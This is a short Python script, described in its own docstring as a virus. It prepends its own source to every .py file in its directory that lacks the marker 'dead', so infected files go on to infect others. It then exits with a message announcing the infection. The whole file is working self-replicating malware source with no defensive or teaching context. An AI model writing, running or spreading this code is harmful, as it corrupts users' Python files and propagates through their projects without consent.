#!/usr/bin/python3
"""
This is a virus that will infect and kill
all .py files in the directory its in.
Infected files can infect new ones.
"""
import os
import sys

PATH = os.path.dirname(os.path.realpath(__file__))
SIGNATURE = "dead"
toinfect = []

def search():
    """ Search every file if it contains .py in filename and SIGNATURE in file """
    for f in os.listdir(PATH):
        if f[-3:] == ".py" and SIGNATURE not in open(f).read():
            toinfect.append(f)

def infect(filestoinfect):
    """ Copy this entire script, resulting in infected files that can infect new ones """
    virus = open(os.path.realpath(__file__))
    virusstring = ""
    for _, line in enumerate(virus):
        virusstring += line
    virus.close()
    for fname in filestoinfect:
        f = open(fname)
        temp = f.read()
        f.close()
        f = open(fname,"w")
        f.write(virusstring + temp)
        f.close()

def bomb():
    """ Kills script """
    sys.exit("This file is infected! Other .py files are now infected too!")


search()
infect(toinfect)
bomb()
